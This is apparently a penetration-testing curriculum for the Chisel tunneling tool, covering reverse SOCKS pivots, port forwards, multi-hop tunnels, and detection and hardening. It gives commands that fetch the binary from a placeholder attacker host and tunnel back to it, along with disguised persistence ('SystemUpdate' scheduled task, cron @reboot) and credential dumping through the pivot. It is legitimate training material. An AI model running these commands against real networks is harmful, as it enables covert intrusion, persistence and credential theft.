# 🔀 Chisel: Complete Mastery Checklist

> **What is Chisel?** Chisel is a fast TCP/UDP tunneling tool written in Go that transports network traffic over HTTP (or HTTPS). It creates an encrypted tunnel between your attack machine (server) and a compromised host (client), allowing you to pivot into internal networks, bypass firewalls, and access services not directly reachable from the internet.
>
> **Why does it exist?** In real-world network penetration tests, the target's internal network is not directly accessible from the attacker's machine. A compromised internet-facing host becomes a pivot point — Chisel turns that host into a tunnel endpoint, routing your traffic through it to reach internal hosts and services.
>
> **When to use it:** During post-exploitation when you need to pivot into an internal network. When a firewall blocks reverse shells on non-HTTP ports (Chisel tunnels over HTTP/HTTPS — often allowed through firewalls). When Ligolo-ng is not available or too complex for the environment. In CTF environments where only port 80/443 is outbound from the target.
>
> **When to avoid it:** When you already have a full C2 (Sliver, Cobalt Strike) that handles pivoting natively. When Ligolo-ng is available and you need a TUN-based approach (more transparent pivoting). When the target network has deep packet inspection that detects HTTP tunneling.
>
> **What mastering Chisel unlocks:** Network pivoting through HTTP/HTTPS even through firewalls. SOCKS5 proxy access to internal networks. Port forwarding to expose internal services. OSCP exam pivoting proficiency. CTF and real-world engagement pivoting chain completion.
>
> **Roadmap Phase:** Phase 5 (Pivoting, Tunneling & Network Access)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

| Pivoting & Tunneling | Post-Exploitation | C2 | Network |
|:--------------------|:-----------------|:---|:--------|
| [🔀 Ligolo-ng](Ligolo-ng.md) | [🐉 LinPEAS](LinPEAS.md) | [🐍 Sliver](Sliver.md) | [🔌 Netcat](Netcat.md) |
| **🔀 Chisel** (you are here) | [🪟 WinPEAS](WinPEAS.md) | [💀 Metasploit](Metasploit_Framework.md) | [🗺️ Nmap](Nmap.md) |
| [🔀 Ligolo-ng](Ligolo-ng.md) | [🩸 BloodHound](BloodHound.md) | [🐍 Impacket](Impacket.md) | [📦 Scapy](Scapy.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & Network Pivoting Theory | 5 | 2–3 hours |
| 2 | Core Usage — Forward & Reverse Tunnels | 6 | 4–6 hours |
| 3 | Intermediate — SOCKS5 Proxy & proxychains | 5 | 4–5 hours |
| 4 | Advanced — Multi-hop, HTTPS, Firewall Bypass | 4 | 4–6 hours |
| 5 | Tool Integration | 4 | 2–3 hours |
| 6 | Practical Labs | 4 | 5–8 hours |
| 7 | Methodology & Detection | 3 | 2–3 hours |
| 8 | Mastery Challenges | 3 | 4–6 hours |
| | **Total** | **34** | **~27–40 hours** |

**Prerequisites:** Networking fundamentals (TCP/IP, ports, routing). Understanding of SSH tunneling concepts (helps but not required). Post-exploitation access on a pivot host (Linux or Windows). Basic understanding of SOCKS proxies.

**Comparison with Ligolo-ng:**
- **Chisel**: HTTP-based, single binary (same binary for server and client), works on port 80/443 through firewalls, simpler setup, SOCKS5 or port-forward only — no full TUN interface.
- **Ligolo-ng**: TUN-based, creates a virtual network interface — tools work natively without proxychains. More powerful but slightly more complex setup. Preferred for OSCP/advanced engagements.
- **Use Chisel when**: firewall only allows HTTP/HTTPS, or quick port forward is needed. **Use Ligolo-ng when**: you need tools to work natively without proxychains overhead.

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Network Pivoting Concepts

- [ ] **Completed** · ⭐ Beginner · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand what network pivoting is and why it is necessary in multi-network environments. |
| **Skills Learned** | Pivot host concept (compromised machine with access to both external and internal network), network segmentation (why internal hosts are not directly reachable), attack tunneling chain (attacker → pivot → internal target), SOCKS proxy concept, port forwarding concept. |
| **Practical Exercise** | Draw a network diagram: Internet → Firewall → DMZ (web server — your pivot) → Internal LAN (AD domain, DB servers). Your attacker machine is on the internet — you can only reach the DMZ host. Chisel lets you tunnel through the web server to reach the internal LAN. |
| **Expected Output** | Network diagram with pivot host, firewall, and target internal network. Understanding of why direct connections to internal hosts are blocked. |

### Task 1.2 — How Chisel Works (HTTP Tunneling)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the technical mechanism behind Chisel's HTTP tunneling. |
| **Skills Learned** | WebSocket over HTTP/HTTPS, multiplexed TCP streams over a single HTTP connection, why HTTP tunneling bypasses firewalls (most firewalls allow outbound HTTP/HTTPS), how Chisel differs from SSH tunneling (no SSH required on target). |
| **Practical Exercise** | Review Chisel architecture: attacker runs `chisel server` → pivot host runs `chisel client` → client connects back to server over HTTP → server receives the connection and routes traffic → you can now reach internal hosts via the server's SOCKS proxy or forwarded ports. |
| **Expected Output** | Architecture diagram with data flow. Understanding of why HTTP tunneling is firewall-friendly. |

### Task 1.3 — Installation & Binary Distribution

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Install Chisel on your attack machine and prepare binaries for target delivery. |
| **Practical Exercise** | Attack machine: `go install github.com/jpillora/chisel@latest` OR download from GitHub releases. Kali: `sudo apt install chisel`. Check: `chisel --help`. For Windows target: download `chisel_windows_amd64.exe` from releases. For Linux target: download `chisel_linux_amd64` → `chmod +x`. Same binary serves as both server and client depending on flags. |
| **Expected Output** | Chisel installed on attack machine. Linux and Windows client binaries ready for upload. |

### Task 1.4 — Forward vs Reverse Tunnels

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the difference between forward and reverse tunnel architectures. |
| **Skills Learned** | **Forward tunnel**: attacker runs server, pivot connects to it (pivot must have outbound access to attacker — common). **Reverse tunnel**: pivot runs server, attacker connects to it (used when attacker can reach pivot's open port — less common). In most firewall scenarios: pivot can reach internet (outbound allowed) but attacker cannot reach pivot directly on arbitrary ports — use reverse tunnel (pivot client → attacker server). |
| **Practical Exercise** | Scenario A: pivot has outbound HTTP to internet → pivot runs chisel client → attacker runs chisel server → attacker proxies traffic via pivot (MOST COMMON — reverse). Scenario B: attacker can reach pivot directly → attacker runs chisel client connecting to pivot's chisel server → less common. |
| **Expected Output** | Decision tree: which tunnel direction to use for a given network configuration. |

### Task 1.5 — proxychains Configuration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Configure proxychains to route your attack tools through Chisel's SOCKS5 proxy. |
| **Practical Exercise** | Edit `/etc/proxychains4.conf` → comment out `socks4 127.0.0.1 9050` → add `socks5 127.0.0.1 1080` (or whatever port Chisel's SOCKS server is listening on). Test: `proxychains nmap -sT -p 22,80,445 <internal_target>`. Note: proxychains adds latency — use `-sT` (TCP connect) not `-sS` (SYN scan) for Nmap. |
| **Expected Output** | proxychains configured to use Chisel SOCKS5. Nmap reaching internal hosts through the tunnel. |

---

# PHASE 2: CORE USAGE

---

### Task 2.1 — Reverse SOCKS5 Proxy (Most Common Use Case)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Set up a reverse SOCKS5 proxy — pivot host connects out to your server, giving you a SOCKS5 proxy to the internal network. |
| **Skills Learned** | `--reverse` flag on server, `R:socks` tunnel specification on client, SOCKS5 proxy binding on attacker machine. |
| **Practical Exercise** | **Attack machine (server):** `chisel server -p 8080 --reverse`. **Pivot host (client):** `./chisel client <attacker_ip>:8080 R:socks`. **Attack machine:** configure proxychains for `socks5 127.0.0.1 1080` → `proxychains nmap -sT -p 22,80,3389 10.10.10.0/24`. |
| **Expected Output** | SOCKS5 proxy running on attack machine port 1080. Internal network hosts reachable via proxychains. |
| **Common Mistakes** | Forgetting `--reverse` on the server (without it, the server does not accept reverse tunnel requests). Wrong port in proxychains config (Chisel SOCKS binds to 1080 by default with `R:socks`). Using `-sS` scan through SOCKS (ICMP/raw packets don't route through SOCKS — use `-sT`). |

### Task 2.2 — Local Port Forward

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Forward a specific internal port to your local machine — useful for accessing a single internal service (RDP, SMB, web app). |
| **Skills Learned** | Local port forward syntax: `<local_port>:<remote_host>:<remote_port>`, accessing forwarded service directly on localhost. |
| **Practical Exercise** | **Server:** `chisel server -p 8080 --reverse`. **Client on pivot:** `./chisel client <attacker>:8080 R:3389:10.10.10.5:3389`. **Attack machine:** `rdesktop 127.0.0.1:3389` OR `xfreerdp /v:127.0.0.1` → connects to internal host's RDP as if it were local. |
| **Expected Output** | Internal RDP service accessible on local port 3389. Understanding of how to forward any port. |

### Task 2.3 — Remote Port Forward (Expose Attack Machine Service)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Expose a service on your attack machine (e.g., HTTP server for payload delivery) to the internal network via the pivot. |
| **Skills Learned** | Remote forward syntax: makes your attack machine's service reachable from the pivot host's internal network. Useful for serving payloads to internal hosts that can't reach the internet. |
| **Practical Exercise** | **Attack machine:** start a Python web server: `python3 -m http.server 8000`. **Server:** `chisel server -p 8080 --reverse`. **Client on pivot:** `./chisel client <attacker>:8080 R:8888:127.0.0.1:8000`. Internal hosts can now download files from the pivot on port 8888 (which serves from your attack machine's port 8000). |
| **Expected Output** | Internal hosts can download files from your attack machine via the tunnel. |

### Task 2.4 — SOCKS5 with Specific Bind Port

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Specify a custom SOCKS5 binding port to avoid conflicts when running multiple pivots. |
| **Practical Exercise** | **Client:** `./chisel client <attacker>:8080 R:2080:socks` → SOCKS proxy binds to attacker's port 2080. Update proxychains: `socks5 127.0.0.1 2080`. Useful when running multiple Chisel sessions simultaneously (different targets, different SOCKS ports). |
| **Expected Output** | SOCKS5 proxy on custom port. Multiple simultaneous Chisel tunnels possible without port conflicts. |

### Task 2.5 — HTTPS Mode (Encrypted Tunnel)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Enable TLS encryption on the Chisel tunnel to protect traffic from network inspection. |
| **Skills Learned** | `--tls-skip-verify` on client (accept self-signed cert), using proper TLS cert (`--tls-cert`, `--tls-key`), when to use HTTPS mode (DPI-aware environments). |
| **Practical Exercise** | **Server:** `chisel server -p 443 --reverse --tls-cert cert.pem --tls-key key.pem`. **Client:** `./chisel client --tls-skip-verify https://<attacker>:443 R:socks`. Traffic is now TLS-encrypted — DPI only sees HTTPS connection to attacker's port 443. |
| **Expected Output** | Encrypted Chisel tunnel over HTTPS port 443 — blends with normal HTTPS traffic. |

### Task 2.6 — Delivering Chisel to the Target

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Transfer the Chisel binary to the pivot host using available methods. |
| **Skills Learned** | Web delivery (`curl`/`wget` from Python HTTP server), Evil-WinRM upload (Windows target), Impacket `smbserver` delivery, base64 transfer for restricted environments. |
| **Practical Exercise** | Method 1 (Linux): `python3 -m http.server 9000` on attacker → `wget http://<attacker>:9000/chisel -O /tmp/chisel && chmod +x /tmp/chisel`. Method 2 (Windows via Evil-WinRM): `upload /home/kali/chisel.exe C:\Windows\Temp\chisel.exe`. |
| **Expected Output** | Chisel binary on target. Executable and ready to connect back. |

---

# PHASE 3: INTERMEDIATE — SOCKS5 & proxychains

---

### Task 3.1 — Nmap Through Chisel SOCKS5

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Scan internal hosts through a Chisel SOCKS5 proxy. |
| **Skills Learned** | proxychains Nmap limitations (TCP connect only, no UDP, no ICMP ping — use `-Pn` to skip ping), scanning speed (slower through SOCKS), port range selection strategy for slow pivots. |
| **Practical Exercise** | `proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985,8080 --open 10.10.10.0/24 -oN internal_scan.txt`. For a quick top-ports scan: add `-T4 --max-retries 1 --min-rate 100`. |
| **Expected Output** | Internal network port scan results. Open services on internal hosts identified. |

### Task 3.2 — Web App Testing Through proxychains

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Access and test internal web applications via the Chisel SOCKS proxy. |
| **Practical Exercise** | Configure Firefox/Burp Suite to use SOCKS5 proxy (`127.0.0.1:1080`). Browse to internal web app: `http://10.10.10.20/`. Burp Suite proxy chain: Burp → Chisel SOCKS5 → internal target. All web traffic routes through the pivot. |
| **Expected Output** | Internal web application accessible in browser via SOCKS proxy. Burp Suite intercepting internal traffic. |

### Task 3.3 — Evil-WinRM Through proxychains

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Connect Evil-WinRM to an internal Windows host through Chisel SOCKS proxy. |
| **Practical Exercise** | `proxychains evil-winrm -i 10.10.10.30 -u Administrator -H <hash>`. Note: Evil-WinRM through proxychains is slightly slower but fully functional. |
| **Expected Output** | Evil-WinRM shell on internal Windows host reachable only through the pivot. |

### Task 3.4 — Impacket Tools Through proxychains

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Run Impacket AD attack tools against internal AD through Chisel SOCKS proxy. |
| **Practical Exercise** | `proxychains impacket-secretsdump corp.local/user:pass@10.10.10.10`. `proxychains bloodhound-python -d corp.local -u user -p pass -dc 10.10.10.10 -c All`. All AD tools work through proxychains — they just route their TCP connections through the SOCKS proxy. |
| **Expected Output** | Impacket secretsdump running against internal DC. BloodHound data collected through pivot. |

### Task 3.5 — Double Pivot (Multi-Hop)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 50 min

| Field | Detail |
|:---|:---|
| **Objective** | Chain two Chisel pivots to reach a third network segment. |
| **Skills Learned** | Multi-hop architecture (attacker → pivot1 → pivot2 → target3), running Chisel server on pivot1 listening on an internal port, pivot2 connecting to pivot1's Chisel server, proxychains with multiple proxy chains. |
| **Practical Exercise** | Attacker → pivot1 (Chisel SOCKS on 1080) → via proxychains, run second Chisel server on pivot1 (internal port) → pivot2 connects to pivot1's Chisel server → second SOCKS on port 1081 → proxychains chains: `socks5 127.0.0.1 1080` then `socks5 127.0.0.1 1081`. |
| **Expected Output** | Two-hop pivot working. Hosts in the third network segment reachable from attack machine. |

---

# PHASE 4: ADVANCED

---

### Task 4.1 — Firewall Bypass via HTTP Tunneling

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Chisel over port 80/443 to bypass egress firewalls that only allow HTTP/HTTPS. |
| **Practical Exercise** | Scenario: pivot host can only make outbound connections on port 443. Run Chisel server on attack machine on port 443 → pivot client connects to `https://<attacker>:443` → firewall sees normal HTTPS traffic → tunnel works. |
| **Expected Output** | Tunnel established through HTTP/HTTPS-only firewall. Understanding of why port 443 is the most firewall-friendly Chisel port. |

### Task 4.2 — Chisel on Windows Targets

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Run the Chisel client on a Windows pivot host. |
| **Practical Exercise** | Upload `chisel.exe` via Evil-WinRM → run: `chisel.exe client <attacker>:8080 R:socks`. On Windows, no `chmod +x` needed. Alternatively run in background: `Start-Process -WindowStyle Hidden .\chisel.exe -ArgumentList "client <attacker>:8080 R:socks"`. |
| **Expected Output** | Chisel tunnel established from Windows pivot host. |

### Task 4.3 — Authentication on Chisel Server

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Require authentication on the Chisel server to prevent unauthorized use of your tunnel server. |
| **Practical Exercise** | `chisel server -p 8080 --reverse --auth user:password`. **Client:** `./chisel client --auth user:password <attacker>:8080 R:socks`. Without auth, anyone who discovers your Chisel server port can use your tunnel. |
| **Expected Output** | Authenticated Chisel server. Understanding of why auth matters if running Chisel on a public IP. |

### Task 4.4 — Persistence: Chisel as a Service

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Set up Chisel client to run persistently on the pivot host — survives reboots and session drops. |
| **Practical Exercise** | Linux: add to crontab: `@reboot /tmp/chisel client <attacker>:8080 R:socks &`. OR create a systemd service unit. Windows: create a scheduled task: `schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\chisel.exe client <attacker>:8080 R:socks" /sc onlogon /ru SYSTEM`. |
| **Expected Output** | Chisel reconnects automatically after reboot. Persistent tunnel for long-term access. |
| **Common Mistakes** | Leaving obvious service names (use generic names that blend with system services). Not testing persistence actually survives reboot. |

---

# PHASE 5: TOOL INTEGRATION

---

### Task 5.1 — Chisel + Nmap + Metasploit Chain

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
| Field | Detail |
|:---|:---|
| **Objective** | Full chain: establish pivot, scan internal network, exploit internal target via SOCKS proxy. |
| **Practical Exercise** | Chisel SOCKS → `proxychains nmap` internal scan → find vulnerable service → `proxychains msfconsole` → `setg Proxies socks5:127.0.0.1:1080` → exploit internal target. |

### Task 5.2 — Chisel + BloodHound.py

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Practical Exercise** | Chisel SOCKS to internal AD → `proxychains bloodhound-python -d corp.local -u user -p pass -dc dc01.corp.local -c All` → import ZIP to BloodHound CE → map AD attack paths from outside the network. |

### Task 5.3 — Chisel vs Ligolo-ng Decision Guide

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
| Field | Detail |
|:---|:---|
| **Objective** | Know when to pick Chisel over Ligolo-ng. |
| **Skills Learned** | Use Chisel: quick setup, HTTP-only firewall, simple port forward needed. Use Ligolo-ng: need tools without proxychains, need UDP support, need a full subnet route (TUN interface). In OSCP: both accepted, Ligolo-ng is preferred for complex pivoting. |

### Task 5.4 — Chisel + Evil-WinRM Full AD Pivot

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
| Field | Detail |
|:---|:---|
| **Practical Exercise** | Foothold on DMZ Linux host → Chisel pivot to internal network → `proxychains nxc smb` to find AD hosts → `proxychains evil-winrm` to Windows targets → full AD post-exploitation through pivot. |

---

# PHASE 6: PRACTICAL LABS

---

### Lab 6.1 — HTB: Two-Network Pivot Machine

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 3–4 hours
| Field | Detail |
|:---|:---|
| **Scenario** | HackTheBox machine with two network interfaces (DMZ + internal). Compromise DMZ host → Chisel SOCKS to internal network → compromise internal host → root. |
| **Success Criteria** | Internal network reachable via Chisel SOCKS. Internal host compromised through pivot. |

### Lab 6.2 — OSCP-Style Pivot Lab

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 3–4 hours
| Field | Detail |
|:---|:---|
| **Scenario** | Home lab: 3 VMs (attack, pivot, internal). Pivot only accessible from attack. Internal only accessible from pivot. Establish Chisel tunnel, scan and exploit internal VM. |
| **Success Criteria** | Chisel SOCKS established. Internal VM port-scanned via proxychains. Service exploited. Shell on internal VM. |

### Lab 6.3 — Windows Pivot via Evil-WinRM

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 2–3 hours
| Field | Detail |
|:---|:---|
| **Scenario** | Windows machine as pivot host. Upload Chisel.exe via Evil-WinRM. Establish SOCKS tunnel. Access internal Windows AD hosts through pivot. |
| **Success Criteria** | Chisel running on Windows pivot. Internal AD reachable. NetExec/BloodHound running through proxy. |

### Lab 6.4 — Double Pivot Lab

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 4–5 hours
| Field | Detail |
|:---|:---|
| **Scenario** | 4-VM network: attack → DMZ → network2 → network3. Establish two Chisel hops to reach the third network. Compromise host in network3. |
| **Success Criteria** | Two-hop Chisel chain working. Hosts in network3 accessible from attack machine. |

---

# PHASE 7: METHODOLOGY & DETECTION

---

### Task 7.1 — Chisel in the Pivoting Methodology

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
| Field | Detail |
|:---|:---|
| **Objective** | Position Chisel correctly in the post-exploitation → pivoting → internal access chain. |
| **Expected Output** | Methodology: Compromise foothold → identify network interfaces → identify internal network → deliver Chisel → establish SOCKS → scan internal → exploit internal → repeat for each network segment. |

### Task 7.2 — Blue Team Detection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Objective** | Understand how defenders detect Chisel tunneling. |
| **Skills Learned** | Chisel generates persistent outbound HTTP connections to a single IP/domain — detectable by anomalous long-lived HTTP sessions in proxy logs, EDR detecting chisel.exe or high-traffic HTTP connections from servers, NetFlow analysis showing large data volumes over HTTP from internal servers. |
| **Expected Output** | Detection rule: "Alert on server-to-external-IP HTTP connections lasting > 10 minutes with consistent byte rates" — indicative of tunneling. |

### Task 7.3 — Hardening Against Pivoting

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
| Field | Detail |
|:---|:---|
| **Objective** | Understand network segmentation controls that reduce pivoting effectiveness. |
| **Skills Learned** | Egress firewall rules (block outbound from servers except to known destinations), application-layer proxies (only allow HTTP through corporate proxy — Chisel to arbitrary IPs blocked), EDR blocking execution of unknown binaries on servers, network segmentation (no direct routing between internal segments without explicit firewall rules). |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Firewall-Only HTTP Pivot

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 3 hours
Simulate a restrictive firewall: pivot host can ONLY make outbound connections on port 443 to the internet. Establish Chisel tunnel over HTTPS port 443. Complete full internal network scan and shell through this tunnel.

### Challenge 8.2 — Multi-Hop Pivot to Third Network

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 4–5 hours
4-VM lab. Two Chisel hops. Reach a host in the third network. Exploit a service on it. Document the entire tunnel setup, the proxychains configuration, and every tool used.

### Challenge 8.3 — Chisel vs Ligolo-ng Comparison

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 3 hours
Solve the same HTB/THM pivot machine using Chisel and then using Ligolo-ng. Document setup time, tool compatibility, speed, and any differences in capability. Write a comparison report: when to use each.

---

## 🎓 Competency Matrix

| Skill | Beginner | Intermediate | Advanced |
|:------|:--------:|:------------:|:--------:|
| Understand HTTP tunneling concept | [ ] | | |
| Reverse SOCKS5 proxy setup | | [ ] | |
| Local port forward to internal service | | [ ] | |
| proxychains configuration and Nmap through SOCKS | | [ ] | |
| Deliver Chisel to Linux target | [ ] | | |
| Deliver Chisel to Windows target | | [ ] | |
| Chisel over HTTPS (port 443) | | [ ] | |
| Multi-hop double pivot | | | [ ] |
| Persistent Chisel via service/crontab | | | [ ] |
| Full AD attack through Chisel pivot | | | [ ] |

---

## 💬 Interview Questions

1. What is network pivoting and why is it necessary in segmented network environments?
2. How does Chisel transport TCP traffic and why does this bypass many firewalls?
3. What is the difference between a reverse SOCKS proxy and a local port forward in Chisel?
4. Why must you use `-sT` instead of `-sS` when running Nmap through a SOCKS proxy?
5. How do you establish a Chisel tunnel when the pivot host can only make outbound connections on port 443?
6. What is the difference between Chisel's SOCKS5 mode and Ligolo-ng's TUN interface approach?
7. How would you set up a double-pivot (two-hop) chain with Chisel?
8. What Windows event logs or network artifacts would indicate Chisel tunneling activity?
9. How would you make a Chisel client persist across reboots on a Linux target?
10. Walk through the full chain from compromising a DMZ host to reaching an internal-only AD domain controller using Chisel.
